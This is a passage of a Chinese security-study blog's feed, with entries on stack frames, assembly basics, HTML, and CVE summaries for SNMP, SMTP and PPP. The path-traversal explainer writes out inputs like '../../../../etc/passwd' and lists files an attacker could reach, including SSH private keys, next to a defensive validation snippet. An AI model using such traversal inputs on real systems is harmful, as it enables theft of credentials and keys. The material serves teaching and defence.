%eax”指令将两个寄存器内的值相加并把结果保存在%eax中。12(%ebp)表示%ebp+12。值得注意的是，变量x实际上被分配到比帧指针低8字节的地址而非之前示意图中现实的4字节。正如之前提到的，局部变量的实际内存布局是取决于编译器的。由汇编代码中的-8(%ebp)能看出，x存放%ebp-8的地址中。因此，通过帧指针以及编译阶段确定的偏移值，就能够找到所有变量的地址。</p><p>现在可以解释为什么a和b是以逆序压入栈中。实际上，从偏移角度来看，顺序并不是反的。由于栈是从高端地址向地段地址增长的，如果先压入参数a，a的偏移值将会高于b，这反倒会在阅读汇编语言代码时感觉顺序反了。例如：a的地址是%ebp+12。b的地址是%ebp+8，就会感觉反了。</p><p><strong>前帧指针和函数调用链</strong>。通常会在一个函数内调用另一个函数。当进入被调用函数前，程序会在栈顶为被调用函数分配一个栈帧。当程序从被调用函数返回时，该栈帧占据的内存空间将会被释放。如下图所示，main()函数调用了foo()函数，而foo()函数又调用了bar()函数。在这个过程中，三个函数调用的栈帧皆分布于栈中。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/image-20250515185503614.png" alt="image-20250515185503614"></p><p>CPU中仅存在一个帧指针寄存器，它总是指向当前函数的栈帧。当进入bar()函数之前，帧指针指向foo()函数的栈帧，当程序跳转到bar()函数时，帧指针将指向bar()函数的栈帧。如果不记得进入进入bar()函数之前帧指针指向的地址，那么一旦从bar()函数返回，将无从知晓foo()函数的栈帧在什么位置。为了解决这个问题，在进入被调用函数之前，<strong>调用者的帧指针的值(称为前栈指针)将会被存储到被调用函数栈帧中的一个固定位置（在返回地址的下面）。当被调用函数返回时，这个位置中存放的值会被用于设置调用者的帧指针寄存器，从而使帧指针重新指向被调用者的栈帧。</strong></p>]]></content>
      
      
      <categories>
          
          <category> SEEDLABs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 缓冲区溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言第1章</title>
      <link href="/2025/05/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC1%E7%AB%A0/"/>
      <url>/2025/05/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%AC%AC1%E7%AB%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="第1章-基础知识"><a href="#第1章-基础知识" class="headerlink" title="第1章 基础知识"></a>第1章 基础知识</h1><p>汇编语言是直接在硬件之上工作的编程语言，我们首先要了解硬件系统的结构，才能有效地应用汇编语言对其编程。我们的原则是，以后用到的知识，以后再说。</p><h2 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1 机器语言"></a>1.1 机器语言</h2><p>机器语言是机器指令的集合。机器指令展开来讲就是一台机器可以正确执行的命令。电子计算机的机器指令是一列二进制数字。一般是CPU（Central Processing Unit，中央处理单元）是一种微处理器，来完成计算机的功能，进行机器指令运算。</p>]]></content>
      
      
      <categories>
          
          <category> 汇编语言 </category>
          
          <category> 汇编语言第1章 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言</title>
      <link href="/2025/05/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
      <url>/2025/05/10/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>汇编语言在逆向工程中是非常重要的一名技术，所以想要成为厉害的Hacker去发现和挖掘漏洞就一定要下功夫，所以在此记录一下我学习汇编语言的过程。我主要参考的是<a href="https://baike.baidu.com/item/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/3460146">汇编语言</a>这本书。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 汇编语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习从0到1</title>
      <link href="/2025/05/09/HTML%E5%AD%A6%E4%B9%A0%E4%BB%8E0%E5%88%B01/"/>
      <url>/2025/05/09/HTML%E5%AD%A6%E4%B9%A0%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>OK，就是突然心血来潮想学习一下前端。今天先从HTML语言学习开始，主要是参考了<a href="https://www.bilibili.com/video/BV14J4114768/?spm_id_from=333.337.search-card.all.click&amp;vd_source=9d23f1276369812af2ff3206fe99b97b">黑马程序员pink老师</a>以及<a href="https://blog.csdn.net/2301_79263365/article/details/139783074?ops_request_misc=%257B%2522request%255Fid%2522%253A%252213d1fd34cbd89deb1c6e14d4d2754b23%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=13d1fd34cbd89deb1c6e14d4d2754b23&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-139783074-null-null.142^v102^pc_search_result_base6&amp;utm_term=%E5%89%8D%E7%AB%AF&amp;spm=1018.2226.3001.4187">这篇博客</a>。当然，网上也有很多资料，书籍的话我看网上推荐<a href="https://baike.baidu.com/item/Head%20First%20HTML%E4%B8%8ECSS/16268491">《Head First HTML与CSS》</a>，但是我稍微看了一下，这本书的内容很多，一共有700多页，我觉得更适合当一本工具书。写这篇我主要是记录一下我的学习过程。当然，学习分为被动学习和主动学习，我们不仅要去看视频和看书，还要写项目才能达到主动学习。那我们现在开始学习HTML。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> HTML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 前端三剑客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SNMP协议漏洞分析</title>
      <link href="/2025/05/07/SNMP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/07/SNMP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="SNMP协议漏洞分析"><a href="#SNMP协议漏洞分析" class="headerlink" title="SNMP协议漏洞分析"></a>SNMP协议漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><ul><li><p>SNMP（<strong>Simple Network Management Protocol</strong>，简单网络管理协议）是一种用来<strong>管理和监控网络设备</strong>的标准协议。</p><hr><h3 id="📡-SNMP-的作用"><a href="#📡-SNMP-的作用" class="headerlink" title="📡 SNMP 的作用"></a>📡 SNMP 的作用</h3><p>SNMP 允许网络管理员使用一台集中管理的计算机（称为 <strong>管理端</strong>）来获取或控制网络中各种设备（如路由器、交换机、服务器、打印机等，称为 <strong>被管理端</strong>）的状态或配置。</p><hr><h3 id="🧱-SNMP-的基本组成"><a href="#🧱-SNMP-的基本组成" class="headerlink" title="🧱 SNMP 的基本组成"></a>🧱 SNMP 的基本组成</h3><p>| 组件                                   | 说明                                                         |<br>| ——————————————————— | —————————————————————————————— |<br>| <strong>管理端（Manager）</strong>                  | 负责发送请求、接收数据、集中管理设备                         |<br>| <strong>代理端（Agent）</strong>                    | 运行在每台被管理设备上，负责收集设备信息并响应管理端的请求   |<br>| <strong>MIB（Management Information Base）</strong> | 一种定义设备中可以被监控的数据结构的数据库（比如 CPU 使用率、接口状态等） |<br>| <strong>协议端口</strong>                           | 默认使用 UDP 协议，监听端口为 <strong>161</strong>（Agent）和 <strong>162</strong>（Trap 信息） |</p><hr><h3 id="🔄-SNMP-的常见操作"><a href="#🔄-SNMP-的常见操作" class="headerlink" title="🔄 SNMP 的常见操作"></a>🔄 SNMP 的常见操作</h3><ul><li><p><code>GET</code>：获取某个参数（如接口状态）</p></li><li><p><code>SET</code>：修改某个参数（如重新启动接口）</p></li><li><p><code>TRAP</code>：由设备主动发送警告（如温度过高、端口断连）</p></li><li><p><code>WALK</code>：遍历某个 MIB 的多个数据项</p></li></ul><hr><h3 id="🛠-SNMP-应用场景"><a href="#🛠-SNMP-应用场景" class="headerlink" title="🛠 SNMP 应用场景"></a>🛠 SNMP 应用场景</h3><ul><li><p>监控服务器 CPU、内存使用率</p></li><li><p>网络设备端口状态监控</p></li><li><p>故障告警系统（通过 Trap 机制）</p></li><li><p>自动化网络配置工具</p></li></ul><hr></li></ul></li></ol><h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h2 id="1-CVE-2025-27147"><a href="#1-CVE-2025-27147" class="headerlink" title="1. CVE-2025-27147"></a><a href="https://www.cve.org/CVERecord?id=CVE-2025-27147">1. CVE-2025-27147</a></h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>GLPI 清单插件处理 GLPI 代理的各种类型的任务，包括网络发现和清单 （SNMP）、软件部署、VMWare ESX 主机远程清单和数据收集（文件、Windows 注册表、WMI）。1.5.0 之前的版本存在不正确的访问控制漏洞。版本 1.5.0 修复了此漏洞。</p><blockquote><h3 id="🧰-GLPI-插件中涉及的各种工具与软件模块"><a href="#🧰-GLPI-插件中涉及的各种工具与软件模块" class="headerlink" title="🧰 GLPI 插件中涉及的各种工具与软件模块"></a>🧰 GLPI 插件中涉及的各种工具与软件模块</h3><p>GLPI 的清单插件配合代理（如 <a href="https://github.com/glpi-project/glpi-agent">GLPI-Agent</a>）或 FusionInventory 使用，可以自动执行多种任务：</p><div class="table-container"><table><thead><tr><th>功能/模块</th><th>描述</th></tr></thead><tbody><tr><td><strong>GLPI-Agent</strong></td><td>一种跨平台的代理程序，安装在客户端设备上，负责采集系统信息并与 GLPI 通信。支持任务如资产清单、命令执行、部署等。</td></tr><tr><td><strong>FusionInventory Agent</strong></td><td>原始的社区版本代理，功能类似，但逐步被 GLPI-Agent 替代</td></tr><tr><td><strong>网络发现（Discovery）</strong></td><td>使用 Ping/SNMP 发现子网中活动设备，例如打印机、交换机、摄像头等</td></tr><tr><td><strong>网络清单（SNMP Inventory）</strong></td><td>通过 SNMP 收集设备的硬件信息、运行状态、端口信息</td></tr><tr><td><strong>软件部署（Deployment）</strong></td><td>向客户端推送并自动安装 MSI、EXE、脚本包。适用于集中化管理软件环境</td></tr><tr><td><strong>VMWare ESX 清单</strong></td><td>使用 VMWare API 获取 ESXi 主机、虚拟机的信息，供虚拟化资产管理</td></tr><tr><td><strong>文件收集任务</strong></td><td>从客户端系统上指定路径中提取文件（如配置文件、日志）</td></tr><tr><td><strong>Windows 注册表</strong></td><td>读取客户端注册表特定项值，用于配置识别或安全检查</td></tr><tr><td><strong>WMI 数据收集</strong></td><td>通过 WMI（Windows Management Instrumentation）提取详细系统属性，如补丁、硬件序列号等</td></tr><tr><td><strong>命令执行</strong></td><td>在客户端上执行指定命令或脚本，通常用于诊断或补丁脚本</td></tr><tr><td><strong>计划任务调度</strong></td><td>定期执行上述任何任务，支持自定义调度策略</td></tr></tbody></table></div><hr></blockquote><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型:"></a>漏洞类型:</h2><p><a href="https://cwe.mitre.org/data/definitions/22.html"><strong>CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</strong></a></p><h4 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h4><p>对受限目录的路径名有不当限制（“路径遍历”），产品使用外部输入来构造路径名，该路径名旨在标识位于受限父目录下的文件或目录，但产品无法正确中和路径名中的特殊元素，这些元素可能导致路径名解析为受限目录之外的位置。这是一种危险的<strong>路径遍历漏洞（Path Traversal）</strong>。</p><blockquote><h3 id="🔍-一、漏洞原理解释"><a href="#🔍-一、漏洞原理解释" class="headerlink" title="🔍 一、漏洞原理解释"></a>🔍 一、漏洞原理解释</h3><h4 id="📂-正常情况（期望行为）"><a href="#📂-正常情况（期望行为）" class="headerlink" title="📂 正常情况（期望行为）"></a>📂 正常情况（期望行为）</h4><p>程序通常会将某个“受限目录”（如 <code>/uploads/</code> 或 <code>C:\data\userfiles\</code>）作为<strong>文件操作的根目录</strong>，限制用户只能在这个目录下上传、下载或访问文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;受限目录： /var/www/app/uploads/</span><br><span class="line">&gt;用户输入： report.pdf</span><br><span class="line">&gt;结果路径： /var/www/app/uploads/report.pdf ✅</span><br></pre></td></tr></table></figure><hr><h4 id="🧨-漏洞发生（路径遍历）"><a href="#🧨-漏洞发生（路径遍历）" class="headerlink" title="🧨 漏洞发生（路径遍历）"></a>🧨 漏洞发生（路径遍历）</h4><p>攻击者输入包含特殊的路径控制符，如 <code>../</code>（代表上一级目录）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;受限目录： /var/www/app/uploads/</span><br><span class="line">&gt;用户输入： ../../../../etc/passwd</span><br><span class="line">&gt;结果路径： /var/www/app/uploads/../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>系统在解析后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;解析后路径： /etc/passwd ❌（敏感系统文件）</span><br></pre></td></tr></table></figure><p>如果没有对 <code>../</code> 等元素进行清理或限制，攻击者就能<strong>越权访问系统文件、配置、脚本等敏感资源</strong>。</p><hr><h3 id="🔓-二、攻击影响举例"><a href="#🔓-二、攻击影响举例" class="headerlink" title="🔓 二、攻击影响举例"></a>🔓 二、攻击影响举例</h3><div class="table-container"><table><thead><tr><th>攻击目标</th><th>后果</th></tr></thead><tbody><tr><td><code>/etc/passwd</code></td><td>获取系统用户列表（类 Unix 系统）</td></tr><tr><td><code>config.php</code></td><td>泄露数据库账号密码</td></tr><tr><td><code>C:\Windows\win.ini</code></td><td>读取 Windows 配置</td></tr><tr><td><code>../../app.db</code></td><td>访问 SQLite 数据库</td></tr><tr><td><code>../../../.ssh/id_rsa</code></td><td>窃取 SSH 私钥（如果权限配置不当）</td></tr></tbody></table></div><hr><h3 id="🛡️-三、防护建议"><a href="#🛡️-三、防护建议" class="headerlink" title="🛡️ 三、防护建议"></a>🛡️ 三、防护建议</h3><ol><li><p><strong>绝对路径固定 + 路径拼接后校验</strong><br>确保最终路径仍在合法目录中，例如使用 <code>realpath()</code> 做校验：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> os</span><br><span class="line">&gt;BASE_DIR = <span class="string">&quot;/var/www/app/uploads&quot;</span> <span class="comment">#受限目录</span></span><br><span class="line">&gt;user_input = <span class="string">&quot;../../../../etc/passwd&quot;</span><span class="comment">#模拟用户输入路径</span></span><br><span class="line">&gt;target_path = os.path.realpath(os.path.join(BASE_DIR, user_input))</span><br><span class="line">&gt;<span class="comment">#os.path.join(BASE_DIR,user_input)拼接用户输入到受限目录后，realpath解析实际路径</span></span><br><span class="line">&gt;<span class="keyword">if</span> <span class="keyword">not</span> target_path.startswith(BASE_DIR):<span class="comment">#如果不在受限目录下则报错</span></span><br><span class="line">   <span class="keyword">raise</span> Exception(<span class="string">&quot;非法路径访问&quot;</span>)</span><br></pre></td></tr></table></figure></li><li><p><strong>清洗用户输入</strong></p><ul><li><p>禁止 <code>../</code>、<code>\..</code>、<code>..%2f</code> 等变种</p></li><li><p>对路径使用白名单或正则表达式限制</p></li></ul></li><li><p><strong>不要允许直接拼接路径</strong><br>永远不要信任用户提供的文件名或路径片段。</p></li><li><p><strong>使用虚拟路径（数据库索引）</strong><br>不直接暴露真实路径，所有文件由系统自动映射管理。</p></li></ol></blockquote><hr><p><img src="https://raw.githubusercontent.com/hxd77/BlogImage/master/BlogNotCDN/CWE-22-Diagram.png" alt="Diagram for CWE-22"></p><h3 id="CWE-73-External-Control-of-File-Name-or-Path"><a href="#CWE-73-External-Control-of-File-Name-or-Path" class="headerlink" title="CWE-73: External Control of File Name or Path"></a><a href="https://cwe.mitre.org/data/definitions/73.html"><strong>CWE-73: External Control of File Name or Path</strong></a></h3><h4 id="描述：-1"><a href="#描述：-1" class="headerlink" title="描述："></a>描述：</h4><p>文件名或路径的外部控制，该产品允许用户输入来控制或影响文件系统作中使用的路径或文件名。</p><h3 id="CWE-552-Files-or-Directories-Accessible-to-External-Parties"><a href="#CWE-552-Files-or-Directories-Accessible-to-External-Parties" class="headerlink" title="CWE-552: Files or Directories Accessible to External Parties"></a><a href="https://cwe.mitre.org/data/definitions/552.html"><strong>CWE-552: Files or Directories Accessible to External Parties</strong></a></h3><h4 id="描述：-2"><a href="#描述：-2" class="headerlink" title="描述："></a>描述：</h4><p>外部方可访问的文件或目录，该产品使未经授权的行为者可以访问文件或目录，即使他们不应该可以访问。</p><h2 id="2-CVE-2024-5557"><a href="#2-CVE-2024-5557" class="headerlink" title="2. CVE-2024-5557"></a><a href="https://www.cve.org/CVERecord?id=CVE-2024-5557">2. CVE-2024-5557</a></h2><h3 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>存在将敏感信息插入日志文件漏洞，当攻击者有权访问控制器日志时，该漏洞可能会导致 SNMP 凭据泄露。</p><h3 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/532.html"><strong>CWE-532: Insertion of Sensitive Information into Log File</strong></a></p><h4 id="描述：-3"><a href="#描述：-3" class="headerlink" title="描述："></a>描述：</h4><p>将敏感信息插入日志文件，产品将敏感信息写入日志文件。</p><p><img src="https://cwe.mitre.org/data/images/CWE-532-Diagram.png" alt="Diagram for CWE-532"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SMTP协议的漏洞分析</title>
      <link href="/2025/05/07/SMTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/07/SMTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="SMTP协议的漏洞分析"><a href="#SMTP协议的漏洞分析" class="headerlink" title="SMTP协议的漏洞分析"></a>SMTP协议的漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SMTP（<strong>Simple Mail Transfer Protocol</strong>，简单邮件传输协议）是互联网中用来<strong>发送电子邮件</strong>的标准通信协议。</p><h3 id="SMTP-的作用"><a href="#SMTP-的作用" class="headerlink" title="SMTP 的作用"></a>SMTP 的作用</h3><p>SMTP 是电子邮件从<strong>客户端发往邮件服务器</strong>，以及<strong>邮件服务器之间转发邮件</strong>时使用的协议。例如：</p><ol><li><p>当你在邮箱客户端（如 Outlook、Foxmail 或手机邮箱 App）写好邮件并点击“发送”时，SMTP 会把邮件发送到收件人的邮件服务器；</p></li><li><p>然后，接收方的邮件服务器再通过 IMAP 或 POP3 协议将邮件提供给收件人读取。</p></li></ol><hr><h3 id="SMTP-的关键特点"><a href="#SMTP-的关键特点" class="headerlink" title="SMTP 的关键特点"></a>SMTP 的关键特点</h3><div class="table-container"><table><thead><tr><th>特点</th><th>说明</th></tr></thead><tbody><tr><td>协议类型</td><td>应用层协议</td></tr><tr><td>端口号（常见）</td><td>默认使用 TCP 的 <strong>25</strong> 端口；加密传输通常使用 <strong>465</strong>（SSL）或 <strong>587</strong>（STARTTLS）端口</td></tr><tr><td>数据格式</td><td>纯文本（包括邮件头和正文）</td></tr><tr><td>传输方向</td><td>主要负责“发送”而非“接收”</td></tr></tbody></table></div><hr><h3 id="SMTP-发送流程示意："><a href="#SMTP-发送流程示意：" class="headerlink" title="SMTP 发送流程示意："></a>SMTP 发送流程示意：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[发件人客户端] --SMTP--&gt; [发件人邮件服务器] --SMTP--&gt; [收件人邮件服务器] --IMAP/POP3--&gt; [收件人客户端]</span><br></pre></td></tr></table></figure><hr><h3 id="常见的-SMTP-应用场景"><a href="#常见的-SMTP-应用场景" class="headerlink" title="常见的 SMTP 应用场景"></a>常见的 SMTP 应用场景</h3><ul><li><p>网站发送注册验证邮件</p></li><li><p>应用程序发送告警邮件</p></li><li><p>企业自动化报告邮件发送</p></li></ul><hr><h2 id="1-CVE-2025-3434"><a href="#1-CVE-2025-3434" class="headerlink" title="1. CVE-2025-3434"></a><a href="https://www.cve.org/CVERecord?id=CVE-2025-3434">1. CVE-2025-3434</a></h2><h3 id="漏洞描述："><a href="#漏洞描述：" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>由于 1.8 之前（包括 1.8）的所有版本，适用于 WordPress 的 SMTP 插件都容易受到通过电子邮件日志存储的跨站点脚本的攻击，这是由于输入清理和输出转义不充分。这使得未经身份验证的攻击者能够在页面中注入任意 Web 脚本，这些脚本将在用户访问注入的页面时执行。</p><blockquote><p>WordPress 是一个开源的内容管理系统(CMS)，最初是为博客设计，但现已发展成为功能强大的网站构建平台。</p></blockquote><h3 id="漏洞类型："><a href="#漏洞类型：" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/79.html"><strong>CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</strong></a></p><h4 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h4><p>在网页生成期间不正确地中和输入（“跨站点脚本”），在将用户可控制的输入放入用作提供给其他用户的网页的输出之前，该铲平不会中和或错误地中和用户可控的输入。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/CWE-79-Diagram.png" alt="Diagram for CWE-79"></p><hr><h2 id="2-CVE-2025-22800"><a href="#2-CVE-2025-22800" class="headerlink" title="2. CVE-2025-22800"></a><a href="https://www.cve.org/CVERecord?id=CVE-2025-22800">2. CVE-2025-22800</a></h2><h3 id="漏洞描述：-1"><a href="#漏洞描述：-1" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>Post SMTP中缺少授权漏洞Post SMTP 允许利用错误配置的访问控制安全级别。此问题影响到Post SMTP：n/a 到2.9.11。</p><blockquote><h4 id="Post-SMTP-简介"><a href="#Post-SMTP-简介" class="headerlink" title="Post SMTP 简介"></a>Post SMTP 简介</h4><p>Post SMTP 是一款流行的 WordPress 插件，专门用于改善和替代 WordPress 默认的邮件发送功能。以下是关于它的详细介绍：</p><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><ol><li><strong>SMTP 邮件发送</strong>：通过外部 SMTP 服务器发送 WordPress 邮件，替代 PHP 的 mail() 函数</li><li><strong>邮件投递可靠性</strong>：提供比 WordPress 默认邮件系统更可靠的邮件发送机制</li><li><strong>邮件日志</strong>：记录所有外发邮件的状态和详细信息</li><li><strong>失败通知</strong>：当邮件发送失败时向管理员发送警报</li></ol></blockquote><h3 id="漏洞类型：-1"><a href="#漏洞类型：-1" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/862.html"><strong>CWE-862: Missing Authorization</strong></a></p><h4 id="描述：-1"><a href="#描述：-1" class="headerlink" title="描述："></a>描述：</h4><p>缺少授权，当参与者尝试访问资源或执行操作时，产品不糊执行授权检查。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/CWE-862-Diagram.png" alt="Diagram for CWE-862"></p><hr><h2 id="3-CVE-2024-9511"><a href="#3-CVE-2024-9511" class="headerlink" title="3. CVE-2024-9511"></a><a href="https://www.cve.org/CVERecord?id=CVE-2024-9511">3. CVE-2024-9511</a></h2><h3 id="漏洞描述：-2"><a href="#漏洞描述：-2" class="headerlink" title="漏洞描述："></a>漏洞描述：</h3><p>FluentSMTP – WP SMTP 插件与 Amazon SES、SendGrid、MailGun、Postmark、Google 和任何适用于 WordPress 的 SMTP 提供程序插件在所有版本（包括 2.2.82）中都容易受到 PHP 对象注入的攻击，方法是在“formatResult”函数中反序列化不受信任的输入。这使得未经身份验证的攻击者可以注入 PHP 对象。易受攻击的软件中不存在已知的 POP 链。如果 POP 链通过目标系统上安装的附加插件或主题存在，则可能允许攻击者删除任意文件、检索敏感数据或执行代码。该漏洞已在版本 2.2.82 中部分修补。</p><blockquote><p>POP链（Property-Oriented Programming Chain，面向属性编程链）是一种利用PHP对象反序列化漏洞进行攻击的技术，通常与反序列化漏洞结合使用，以实现任意代码执行、文件操作或敏感数据泄露。</p><p><code>formatResult</code> 是 FluentSMTP 插件中用于<strong>格式化 SMTP 邮件发送结果</strong>的函数，主要功能包括：</p><ul><li>解析邮件服务商（如 Amazon SES、SendGrid）返回的响应数据</li><li>将原始响应转换为 WordPress 可处理的格式（如成功/失败状态、错误消息）</li><li>记录日志或返回给调用者</li></ul></blockquote><h3 id="漏洞类型：-2"><a href="#漏洞类型：-2" class="headerlink" title="漏洞类型："></a>漏洞类型：</h3><p><a href="https://cwe.mitre.org/data/definitions/502.html"><strong>CWE-502: Deserialization of Untrusted Data</strong></a></p><h4 id="描述：-2"><a href="#描述：-2" class="headerlink" title="描述："></a>描述：</h4><p>不受信任数据的反序列化，该产品反序列化不受信任的数据，但未充分确保生成的数据有效。</p><p><img src="https://cdn.jsdelivr.net/gh/hxd77/BlogImage/TyporaImage/CWE-502-Diagram.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PPP协议漏洞分析</title>
      <link href="/2025/05/07/PPP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/07/PPP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="PPP协议的漏洞分析"><a href="#PPP协议的漏洞分析" class="headerlink" title="PPP协议的漏洞分析"></a>PPP协议的漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PPP 协议，全称 <strong>Point-to-Point Protocol（点对点协议）</strong>，是一种工作在 <strong>数据链路层（OSI 第二层）</strong> 的通信协议，专门用于在<strong>两台节点设备之间建立直连链路</strong>，以便安全、可靠地传输多种网络层协议（如 IP、IPX、AppleTalk 等）。</p><hr><h3 id="🧩-一句话定义："><a href="#🧩-一句话定义：" class="headerlink" title="🧩 一句话定义："></a>🧩 一句话定义：</h3><blockquote><p><strong>PPP 是一种用于串行链路的标准封装协议，能提供链路建立、认证、压缩、错误检测和多协议封装能力。</strong></p></blockquote><hr><h3 id="🔧-PPP-的主要功能包括："><a href="#🔧-PPP-的主要功能包括：" class="headerlink" title="🔧 PPP 的主要功能包括："></a>🔧 PPP 的主要功能包括：</h3><div class="table-container"><table><thead><tr><th>功能</th><th>说明</th></tr></thead><tbody><tr><td><strong>多协议支持</strong></td><td>可传输 IPv4、IPv6、AppleTalk、IPX 等多种网络层协议</td></tr><tr><td><strong>链路建立与配置</strong></td><td>使用 LCP（链路控制协议）协商链路参数，如最大帧大小、压缩等</td></tr><tr><td><strong>身份验证</strong></td><td>可选使用 PAP 或 CHAP 认证机制，确认连接双方身份</td></tr><tr><td><strong>网络层协议协商</strong></td><td>使用 NCP 协议，如 IPCP（用于 IP 地址协商）</td></tr><tr><td><strong>错误检测</strong></td><td>采用帧校验（如 CRC）保障链路层数据的完整性</td></tr></tbody></table></div><hr><h3 id="📦-PPP-帧结构"><a href="#📦-PPP-帧结构" class="headerlink" title="📦 PPP 帧结构"></a>📦 PPP 帧结构</h3><p>PPP 的帧结构（基于 HDLC）如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------+----------+---------+--------+-------------+----------+</span><br><span class="line">| Flag(7E) | Address  | Control | Protocol | Payload   | FCS (CRC)|</span><br><span class="line">|  1 Byte  | 1 Byte   | 1 Byte  | 1~2 Byte| 可变长度   | 2 Byte   |</span><br><span class="line">+----------+----------+---------+--------+-------------+----------+</span><br></pre></td></tr></table></figure><ul><li><p><strong>Flag（01111110）</strong>：起始/结束标志</p></li><li><p><strong>Address</strong>：固定为 0xFF（广播地址）</p></li><li><p><strong>Control</strong>：固定为 0x03（无序帧）</p></li><li><p><strong>Protocol</strong>：指明上层协议（如 0x0021 表示 IPv4）</p></li><li><p><strong>Payload</strong>：有效负载</p></li><li><p><strong>FCS</strong>：帧校验序列（检测错误）</p></li></ul><hr><h3 id="🌐-常见应用场景"><a href="#🌐-常见应用场景" class="headerlink" title="🌐 常见应用场景"></a>🌐 常见应用场景</h3><div class="table-container"><table><thead><tr><th>场景</th><th>说明</th></tr></thead><tbody><tr><td>拨号上网（ADSL）</td><td>使用 PPP over Ethernet（PPPoE）</td></tr><tr><td>串口通信</td><td>两设备通过串口线直接建立点对点连接</td></tr><tr><td>工业设备、VPN 设备等</td><td>使用 PPP 实现 IP 通信和认证</td></tr></tbody></table></div><hr><h3 id="✅-总结一句话："><a href="#✅-总结一句话：" class="headerlink" title="✅ 总结一句话："></a>✅ 总结一句话：</h3><p>PPP 是<strong>面向点对点连接的、功能全面的数据链路层协议</strong>，尤其适合在串行线路上封装和传输多种网络层协议，具备链路控制、身份验证与协议协商等核心能力。</p><hr><h2 id="1-CVE-2023-20819"><a href="#1-CVE-2023-20819" class="headerlink" title="1. CVE-2023-20819"></a><a 